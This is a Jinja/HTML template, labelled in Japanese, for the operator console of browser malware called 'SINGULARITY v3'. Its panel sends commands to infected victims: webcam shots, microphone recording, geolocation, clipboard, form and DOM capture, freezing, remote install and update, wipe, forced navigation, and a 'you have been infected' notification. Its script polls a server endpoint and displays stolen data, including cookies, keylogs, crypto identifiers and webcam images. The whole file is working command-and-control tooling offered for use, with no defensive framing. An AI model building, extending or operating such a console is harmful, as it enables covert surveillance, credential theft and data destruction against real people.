{# ===================== SINGULARITY v3 RATコンソール（追記） ===================== #}
{% if is_sg %}
<style>
.x-wrap{margin:14px 0;background:#0f1218;border:1px solid #23303f;border-radius:12px;padding:14px}
.x-wrap h3{margin:0 0 10px;font-size:14px;color:#7ee08a}
.x-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:8px 0}
.x-wrap select,.x-wrap input{background:#0b0e13;color:#dfe7f2;border:1px solid #26313f;
  border-radius:7px;padding:7px 9px;font:12px ui-monospace,Menlo,monospace}
.x-wrap button{background:#182231;color:#dfe7f2;border:1px solid #2b3a4d;border-radius:8px;
  padding:7px 12px;font-size:12px;font-weight:600;cursor:pointer}
.x-wrap button.hot{background:#00c46a;border-color:#00c46a;color:#04240f}
.x-wrap button.red{background:#7a1f1f;border-color:#a33;color:#ffd9d9}
.x-out{margin-top:10px;background:#080a0e;border:1px solid #1d2632;border-radius:8px;
  padding:10px;font:11.5px/1.7 ui-monospace,Menlo,monospace;color:#9fb4cc;
  white-space:pre-wrap;max-height:340px;overflow:auto}
.x-shot{max-width:320px;border:1px solid #26313f;border-radius:8px;margin-top:8px;display:block}
.x-k{color:#7ee08a}
.x-d{color:#54718f}
</style>
<div class="x-wrap">
  <h3>🎛 RAT / C2 コンソール（v3・個体別）</h3>
  <div class="x-row">
    <span class="x-d">対象個体</span>
    <select id="x-sid">
      <option value="">（全個体）</option>
      {% for s in sids %}<option value="{{ s }}">{{ s }}</option>{% endfor %}
    </select>
    <button id="x-load" type="button">🔄 取得</button>
    <button id="x-auto" type="button">▶ 自動更新</button>
    <button id="x-clr" type="button" class="red">🗑 コマンド履歴消去</button>
  </div>

  <div class="x-row">
    <span class="x-d">捕獲</span>
    <button data-cmd="shot" type="button">📷 webcam</button>
    <button data-cmd="mic" type="button">🎙 マイク3秒</button>
    <button data-cmd="geo" type="button">📍 現在地</button>
    <button data-cmd="clip" type="button">📋 クリップボード</button>
    <button data-cmd="dom" type="button">📄 DOM/フォーム</button>
    <button data-cmd="speak" type="button">🔊 発話</button>
    <button data-cmd="pip" type="button">🪟 最前面窓</button>
  </div>

  <div class="x-row">
    <span class="x-d">制御</span>
    <button data-cmd="freeze" data-arg="soft" type="button">❄ 凍結(soft)</button>
    <button data-cmd="freeze" data-arg="hard" type="button">❄ 凍結(hard)</button>
    <button data-cmd="reload" type="button">♻ reload</button>
    <button data-cmd="update" type="button">⬆ OTA更新</button>
    <button data-cmd="install" type="button">📲 インストール</button>
    <button data-cmd="badge" data-arg="9" type="button">🔢 バッジ</button>
    <button data-cmd="notify" data-arg="感染しました" type="button">🔔 通知</button>
    <button data-cmd="wipe" type="button" class="red">☠ wipe</button>
  </div>

  <div class="x-row">
    <span class="x-d">任意</span>
    <input id="x-arg" placeholder="URL / 文言 / レベル0-6" style="min-width:260px">
    <button data-cmd="open" data-input="1" type="button">↗ 新窓で開く</button>
    <button data-cmd="nav" data-input="1" type="button">➡ 遷移</button>
    <button data-cmd="speak" data-input="1" type="button">🔊 任意文言</button>
    <button data-cmd="title" data-input="1" type="button">🏷 タイトル書換</button>
  </div>

  <div class="x-out" id="x-out">（「取得」を押すと、その個体の最新データが出ます）</div>
  <img id="x-img" class="x-shot" style="display:none" alt="rat">
</div>

<script>
(function () {
  var code = {{ code|tojson }};
  var $ = function (i) { return document.getElementById(i); };
  var out = $("x-out"), img = $("x-img"), timer = null;

  function form(action, fields) {
    var f = document.createElement("form");
    f.method = "post"; f.action = action;
    Object.keys(fields).forEach(function (k) {
      var i = document.createElement("input");
      i.type = "hidden"; i.name = k; i.value = fields[k] == null ? "" : fields[k];
      f.appendChild(i);
    });
    document.body.appendChild(f); f.submit();
  }

  function send(kind, arg) {
    form("/vp/" + code + "/cmd", { kind: kind, arg: arg || "", sid: $("x-sid").value });
    out.textContent = "送信: " + kind + (arg ? " (" + arg + ")" : "") + " → " + ($("x-sid").value || "全個体");
  }

  document.querySelectorAll("[data-cmd]").forEach(function (b) {
    b.addEventListener("click", function () {
      var a = b.getAttribute("data-arg") || "";
      if (b.getAttribute("data-input")) a = $("x-arg").value;
      send(b.getAttribute("data-cmd"), a);
    });
  });

  $("x-clr").addEventListener("click", function () {
    form("/vp/" + code + "/cmds/clear", {});
  });

  function render(j) {
    if (!j || !j.ok) { out.textContent = "データなし"; return; }
    var d = j.data || {}, L = [];
    var order = ["rat.shot","rat.mic","rat.geo","rat.clip","rat.dom","dom","cookies","keylog",
                 "crypto.id","sse","peers","bomb","privacy.sw","privacy.periodic","spoof",
                 "burn.workers","burn.webgpu","worklet","disk.writtenMB","ram.mb","verdict.fingerprintId"];
    order.forEach(function (k) { if (d[k]) L.push(k); });
    Object.keys(d).forEach(function (k) { if (L.indexOf(k) < 0) L.push(k); });

    out.innerHTML = L.slice(0, 120).map(function (k) {
      var v = d[k] && d[k].v;
      var short = String(v == null ? "" : v);
      if (k === "rat.shot" || k === "selfie") short = "(画像)";
      if (k === "rat.mic") short = "(音声 base64 " + short.length + "文字)";
      if (short.length > 600) short = short.slice(0, 600) + "…";
      return '<span class="x-k">' + k + '</span> <span class="x-d">' + (d[k] && d[k].ts || "") +
             '</span>\n' + escape(short);
    }).join("\n\n");

    var shot = (d["rat.shot"] && d["rat.shot"].v) || (d["selfie"] && d["selfie"].v);
    if (shot && shot.indexOf("data:") === 0) { img.src = shot; img.style.display = "block"; }
    else img.style.display = "none";
  }
  function escape(s) { return String(s).replace(/[&<>]/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]; }); }

  function load() {
    fetch("/api/vp/" + code + "/rat?sid=" + encodeURIComponent($("x-sid").value), { cache: "no-store" })
      .then(function (r) { return r.json(); }).then(render).catch(function () { out.textContent = "取得失敗"; });
  }
  $("x-load").addEventListener("click", load);
  $("x-auto").addEventListener("click", function () {
    if (timer) { clearInterval(timer); timer = null; $("x-auto").textContent = "▶ 自動更新"; }
    else { timer = setInterval(load, 4000); $("x-auto").textContent = "⏸ 自動更新中"; load(); }
  });
  $("x-sid").addEventListener("change", load);
})();
</script>
{% endif %}
